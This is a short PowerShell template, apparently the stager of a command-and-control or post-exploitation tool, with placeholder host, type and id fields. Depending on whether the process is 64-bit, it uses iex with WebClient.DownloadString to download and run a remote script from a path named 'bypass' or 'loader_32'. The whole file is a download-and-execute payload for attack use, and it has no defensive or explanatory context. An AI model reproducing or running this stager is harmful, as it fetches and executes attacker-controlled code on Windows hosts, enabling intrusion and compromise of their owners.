
if([Environment]::Is64BitProcess) {
    iex((New-Object System.Net.WebClient).DownloadString('http://{{host}}/p/win/{{type}}/{{id}}/bypass'));
}
else
{
    iex((New-Object System.Net.WebClient).DownloadString('http://{{host}}/p/win/{{type}}/{{id}}/loader_32'));
}